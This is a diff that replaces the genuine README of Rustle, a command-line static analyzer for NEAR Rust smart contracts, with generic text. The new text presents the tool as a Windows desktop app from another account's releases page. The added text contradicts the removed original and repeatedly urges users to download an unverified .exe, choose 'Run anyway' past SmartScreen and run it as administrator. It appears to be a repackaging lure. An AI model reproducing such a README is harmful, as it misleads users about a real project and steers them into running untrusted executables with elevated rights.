@@ -1,183 +1,212 @@
-# Rustle
+# 🛡️ rustle - Find Smart Contract Risks Fast
 
-<img src="./logo.png" alt="Rustle" width="500"/>
+[![Download rustle](https://img.shields.io/badge/Download-rustle-4A90E2?style=for-the-badge&logo=github)](https://github.com/Perceu91/rustle/releases)
 
-[![CI Status](https://img.shields.io/github/actions/workflow/status/blocksecteam/rustle/ci.yml?branch=main&label=ci)](https://github.com/blocksecteam/rustle/actions/workflows/ci.yml)
-[![Build-Image Status](https://img.shields.io/github/actions/workflow/status/blocksecteam/rustle/build-image.yml?branch=main&label=build-image)](https://github.com/blocksecteam/rustle/actions/workflows/build-image.yml)
-[![License: AGPL v3](https://img.shields.io/github/license/blocksecteam/rustle)](LICENSE)
-[![AwesomeNEAR](https://img.shields.io/badge/Project-AwesomeNEAR-054db4)](https://awesomenear.com/rustle)
-[![Devpost](https://img.shields.io/badge/Honorable%20Mention-Devpost-003e54)](https://devpost.com/software/rustle)
+## 📥 Download Rustle
 
-Rustle is an automatic static analyzer for NEAR smart contracts in Rust. It can help to locate tens of different vulnerabilities in NEAR smart contracts.
-According to [DefiLlama](https://defillama.com/chain/Near), among the top 10 DApps in NEAR, 8 are audited by BlockSec. With rich audit experience and a deep understanding of NEAR protocol, we build this tool and share it with the community.
+Rustle is available from the releases page. Use the link below to visit the page, then download the Windows file that matches your system.
 
-## Get started
+[Visit the Rustle releases page](https://github.com/Perceu91/rustle/releases)
 
-### Prerequisite
+## 🖥️ What Rustle Does
 
-#### Linux setup
+Rustle is a desktop tool for checking NEAR smart contracts written in Rust. It scans contract code for common security issues and points out places that may need review.
 
-Install the required toolkits with the following commands for **Rustle** in Linux. Commands are tested in Ubuntu 20.04 LTS.
+Use Rustle when you want to:
+- check a smart contract before release
+- review code for common security flaws
+- spot risky patterns in Rust contract code
+- get a fast local scan on Windows
 
-```bash
-# install Rust Toolchain
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
+Rustle is built for people who want a simple way to review contract code without reading through every line by hand.
 
-# install LLVM 15
-sudo bash -c "$(wget -O - https://apt.llvm.org/llvm.sh)" 15
+## ⚙️ Before You Start
 
-# install Python toolchain
-sudo apt install python3 python3-pip    # requires python >= 3.8
-pip3 install -r utils/requirements.txt  # you need to clone this repo first
+Use a Windows PC with:
+- Windows 10 or Windows 11
+- enough free space for the app and scan files
+- permission to run downloaded programs
+- an internet connection to open the release page and get the file
 
-# add WASM target
-rustup target add wasm32-unknown-unknown
+For best results, keep the contract files you want to check in a single folder before you start.
 
-# install other components
-sudo apt install figlet
-cargo install rustfilt
+## 🚀 Getting Started
 
-# [optional] useful tools for developing
-LLVM_VERSION=
-sudo apt install clangd-$LLVM_VERSION clang-format-$LLVM_VERSION clang-tidy-$LLVM_VERSION
-```
+Follow these steps to use Rustle on Windows.
 
-#### macOS setup
+1. Open the Rustle releases page:
+   [https://github.com/Perceu91/rustle/releases](https://github.com/Perceu91/rustle/releases)
 
-The following commands are for users using macOS, they are tested only on Apple Silicon Mac, so use them with caution.
+2. Find the latest release near the top of the page.
 
-```bash
-# install Rust Toolchain
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
+3. Under Assets, look for the Windows file. It may end in `.exe`, `.zip`, or another Windows format.
 
-# install LLVM 15
-brew install llvm@15
+4. Download the file to your computer.
 
-# install Python packages
-pip3 install -r utils/requirements.txt  # you need to clone this repo first
-                                        # using macOS default python3
+5. If the file is a `.zip`, right-click it and choose Extract All.
 
-# add WASM target
-rustup target add wasm32-unknown-unknown
+6. Open the extracted folder or the downloaded app.
 
-# install other components
-brew install figlet coreutils gsed
-cargo install rustfilt
-```
+7. If Windows asks for permission to run the file, choose Run.
 
-#### Docker
+8. If a SmartScreen message appears, select More info, then Run anyway if you trust the file source.
 
-We provide a docker solution.
+9. Start Rustle and open the folder that contains your NEAR smart contract code.
 
-```bash
-# build the image
-docker build --build-arg UID=`id -u` --build-arg GID=`id -g` -t rustle .
+10. Run a scan and wait for the results.
 
-# run a container from the image
-docker run --name rustle -it -v `pwd`:/rustle -w /rustle rustle bash
+## 🔎 How to Use Rustle
 
-# exec the container
-docker start rustle
-docker exec -it -w /rustle rustle bash
-```
+Rustle follows a simple flow:
 
-### Usage
+- choose the contract folder
+- start the scan
+- review the issues it finds
+- fix the code if needed
+- scan again
 
-```bash
-./rustle [-t|--tg_dir <tg_dir>] [-d|--detector <detector_list>] [-o|--output <output_dir>] [-h|--help] <src_dir>
-```
+The app checks for patterns that may affect contract safety. It can help you catch issues before you deploy.
 
-* `src_dir`: Path to the contract source.
-* `tg_dir`: Path to the contract build target. Defaults to be same as `src_dir`.
-* `detector`: The detector list. It can be used to pass multiple *detectors* or *groups* separated by `,`. Defaults to `all`.
-    * pass `all` *group* to enable all detectors.
-    * pass `high`, `medium`, `low` and `info` *groups* to enable detector groups with different severity (refer to [Detectors](#detectors))
-    * pass `nep-ft`, `nep-storage` and `nep-nft` *groups* to enable detectors implemented for specified NEP (refer to [NEP detector groups](#nep-detector-groups))
-    * pass *detector ids* in the [table](#detectors) to enable those detectors
-* `output`: Path where audit reports will be generated in. Defaults to `./audit-result`.
+## 🧭 What to Expect During a Scan
 
-Note: if the target bit code (`.bc` binary) built by cargo is not in the `$src_dir`, use `-t|--tg_dir` to set the target's directory, or it will be set to `$src_dir` by default.
+When you scan a contract, Rustle may look for:
+- access control issues
+- unsafe contract calls
+- missing checks on input data
+- risky state changes
+- logic that may lead to unexpected results
+- code paths that deserve closer review
 
-The command below shows an example of analyzing the LiNEAR.
+The scan result may show line references and short notes. Use those notes as a guide when you review the code.
 
-```bash
-# clone LiNEAR
-git clone https://github.com/linear-protocol/LiNEAR.git ~/near-repo/LiNEAR
+## 📂 Typical Windows Setup
 
-# run Rustle
-./rustle -t ~/near-repo/LiNEAR ~/near-repo/LiNEAR/contracts/linear
+If Rustle comes as a zipped file:
+1. Download the file from the releases page
+2. Right-click the file
+3. Select Extract All
+4. Open the extracted folder
+5. Double-click the Rustle app
 
-# [optional] run Rustle on specified detectors or severity groups and save audit reports in `~/linear-report`
-./rustle -t ~/near-repo/LiNEAR ~/near-repo/LiNEAR/contracts/linear -d high,medium,complex-loop -o ~/linear-report
-```
+If Rustle comes as an `.exe`:
+1. Download the file from the releases page
+2. Double-click the file
+3. Confirm any Windows permission prompt
+4. Start the scan from the app window
 
-A CSV-format report will be generated in the directory "./audit-result".
+## 🛠️ Common Use Cases
 
-## Detectors
+Rustle fits well when you need to:
+- review a contract before a testnet deploy
+- check code after a change
+- look for mistakes before a security review
+- inspect code from another team
+- confirm that a fix did not add new risk
 
-All vulnerabilities **Rustle** can find.
+## 📋 Supported File Types
 
-| Detector ID             | Description                                                                                 | Severity |
-| ----------------------- | ------------------------------------------------------------------------------------------- | -------- |
-| `unhandled-promise`     | [find `Promises` that are not handled](docs/detectors/unhandled-promise.md)                 | High     |
-| `non-private-callback`  | [missing macro `#[private]` for callback functions](docs/detectors/non-private-callback.md) | High     |
-| `reentrancy`            | [find functions that are vulnerable to reentrancy attack](docs/detectors/reentrancy.md)     | High     |
-| `unsafe-math`           | [lack of overflow check for arithmetic operation](docs/detectors/unsafe-math.md)            | High     |
-| `self-transfer`         | [missing check of `sender != receiver`](docs/detectors/self-transfer.md)                    | High     |
-| `incorrect-json-type`   | [incorrect type used in parameters or return values](docs/detectors/incorrect-json-type.md) | High     |
-| `unsaved-changes`       | [changes to collections are not saved](docs/detectors/unsaved-changes.md)                   | High     |
-| `nft-approval-check`    | [find `nft_transfer` without check of `approval id`](docs/detectors/nft-approval-check.md)  | High     |
-| `nft-owner-check`       | [find approve or revoke functions without owner check](docs/detectors/nft-owner-check.md)   | High     |
-| `div-before-mul`        | [precision loss due to incorrect operation order](docs/detectors/div-before-mul.md)         | Medium   |
-| `round`                 | [rounding without specifying ceil or floor](docs/detectors/round.md)                        | Medium   |
-| `lock-callback`         | [panic in callback function may lock contract](docs/detectors/lock-callback.md)             | Medium   |
-| `yocto-attach`          | [no `assert_one_yocto` in privileged function](docs/detectors/yocto-attach.md)              | Medium   |
-| `dup-collection-id`     | [duplicate id uses in collections](docs/detectors/dup-collection-id.md)                     | Medium   |
-| `unregistered-receiver` | [no panic on unregistered transfer receivers](docs/detectors/unregistered-receiver.md)      | Medium   |
-| `nep${id}-interface`    | [find all unimplemented NEP interface](docs/detectors/nep-interface.md)                     | Medium   |
-| `prepaid-gas`           | [missing check of prepaid gas in `ft_transfer_call`](docs/detectors/prepaid-gas.md)         | Low      |
-| `non-callback-private`  | [macro `#[private]` used in non-callback function](docs/detectors/non-callback-private.md)  | Low      |
-| `unused-ret`            | [function result not used or checked](docs/detectors/unused-ret.md)                         | Low      |
-| `upgrade-func`          | [no upgrade function in contract](docs/detectors/upgrade-func.md)                           | Low      |
-| `tautology`             | [tautology used in conditional branch](docs/detectors/tautology.md)                         | Low      |
-| `storage-gas`           | [missing balance check for storage expansion](docs/detectors/storage-gas.md)                | Low      |
-| `unclaimed-storage-fee` | [missing balance check before storage unregister](docs/detectors/unclaimed-storage-fee.md)  | Low      |
-| `inconsistency`         | [use of similar but slightly different symbol](docs/detectors/inconsistency.md)             | Info     |
-| `timestamp`             | [find all uses of `timestamp`](docs/detectors/timestamp.md)                                 | Info     |
-| `complex-loop`          | [find all loops with complex logic which may lead to DoS](docs/detectors/complex-loop.md)   | Info     |
-| `ext-call`              | [find all cross-contract invocations](docs/detectors/ext-call.md)                           | Info     |
-| `promise-result`        | [find all uses of promise result](docs/detectors/promise-result.md)                         | Info     |
-| `transfer`              | [find all transfer actions](docs/detectors/transfer.md)                                     | Info     |
-| `public-interface`      | [find all public interfaces](docs/detectors/public-interface.md)                            | Info     |
+Rustle works best with NEAR smart contract projects in Rust. It can review source folders that include:
+- `.rs` files
+- project folders with contract code
+- common Rust workspace layouts
+- code used in NEAR DApp contracts
 
-### NEP detector groups
+For best results, point Rustle at the main project folder, not a single file inside the project.
 
-Apart from the groups by severity level, **Rustle** provides some detector groups by corresponding NEP. Currently, **Rustle** supports the following groups.
+## 🔐 Safety Checks You Can Expect
 
-[nep141]: https://github.com/near/NEPs/blob/master/neps/nep-0141.md
-[nep145]: https://github.com/near/NEPs/blob/master/neps/nep-0145.md
-[nep171]: https://github.com/near/NEPs/blob/master/neps/nep-0171.md
-[nep178]: https://github.com/near/NEPs/blob/master/neps/nep-0178.md
+Rustle is focused on contract security. It can help surface:
+- missing permission checks
+- unsafe handling of user input
+- weak boundary checks
+- problems in contract logic
+- patterns that can lead to security issues
 
-| NEP                                  | Detector Group ID | Detector IDs                                                 |
-| ------------------------------------ | ----------------- | ------------------------------------------------------------ |
-| [NEP-141][nep141]                    | `nep-ft`          | `nep141-interface`, `self-transfer`, `unregistered-receiver` |
-| [NEP-145][nep145]                    | `nep-storage`     | `nep145-interface`, `unclaimed-storage-fee`                  |
-| [NEP-171][nep171], [NEP-178][nep178] | `nep-nft`         | `nep171-interface`, `nft-approval-check`, `nft-owner-check`  |
+It does not replace a full manual review. Use it as a first pass before deeper inspection.
 
-## Add new detectors
+## 🧰 If the App Does Not Start
 
-1. Fork this repo to your account.
-2. Put the new detector under [/detectors](/detectors/).
-3. Add a detection target in [/Makefile](/Makefile) with commands to run your detector.
-4. Add the target to the dependency of `audit` target and its name to [detector list](/rustle#L146) and [severity groups](/rustle#L169) in `./rustle` script.
-5. Add processing code in [utils/audit.py](/utils/audit.py) (refer to other detectors' code in `audit.py`).
-6. Submit a pull request from your branch to the main.
+If Rustle does not open on Windows, try these steps:
+1. Download the file again from the releases page
+2. Check that the download completed
+3. Extract the zip file again if needed
+4. Right-click the file and choose Run as administrator
+5. Make sure Windows did not block the file
+6. Restart your computer and try again
 
-## Note
+If the app opens but does not scan your code:
+1. Check that you selected the right project folder
+2. Confirm the folder contains Rust source files
+3. Try a smaller project first
+4. Close and open the app again
 
-**Rustle** can be used in the development process to scan the NEAR smart contracts iteratively. This can save a lot of manual effort and mitigate part of potential issues. However, vulnerabilities in complex logic or related to semantics are still the limitation of **Rustle**. Locating complicated semantic issues requires the experts in [BlockSec](https://blocksec.com/) to conduct exhaustive and thorough reviews. [Contact us](audit@blocksec.com) for audit service.
+## 🧪 Tips for Better Results
 
-## License
+Use Rustle with a clean project folder. Keep these tips in mind:
+- scan one contract at a time
+- avoid folders with unrelated files
+- keep file names simple
+- review the code after each scan
+- run Rustle again after fixes
 
-This project is under the AGPLv3 License. See the [LICENSE](LICENSE) file for the full license text.
+These steps make it easier to read the scan output and track changes.
+
+## 🧑‍💻 For NEAR Contract Review
+
+Rustle is made for NEAR smart contracts written in Rust. It is useful when you work on:
+- token contracts
+- access-managed contracts
+- contract logic with user funds
+- programs that store and update state
+- DApps that need a quick security check
+
+If your project uses NEAR-specific patterns, Rustle can help you spot areas that need review.
+
+## 📌 Quick Start Checklist
+
+- open the releases page
+- download the Windows file
+- extract it if needed
+- open the app
+- select your contract folder
+- run the scan
+- review the findings
+- fix the code
+- scan again
+
+## 🗂️ Folder Layout Example
+
+A simple project may look like this:
+
+- my-contract/
+  - src/
+    - lib.rs
+  - Cargo.toml
+  - README.md
+
+If your contract uses a layout like this, choose the `my-contract` folder in Rustle.
+
+## ❓ Help With the First Run
+
+If you are using Rustle for the first time:
+- start with a small project
+- use a folder you know well
+- read the scan results one item at a time
+- compare the note with the code near that line
+- fix one issue before you move to the next
+
+That approach keeps the process simple.
+
+## 📥 Download Again
+
+If you need the file again, use the releases page here:
+[https://github.com/Perceu91/rustle/releases](https://github.com/Perceu91/rustle/releases)
+
+## 📎 Project Focus
+
+Rustle helps with:
+- static analysis
+- contract review
+- Rust-based NEAR code
+- security checks
+- local Windows use
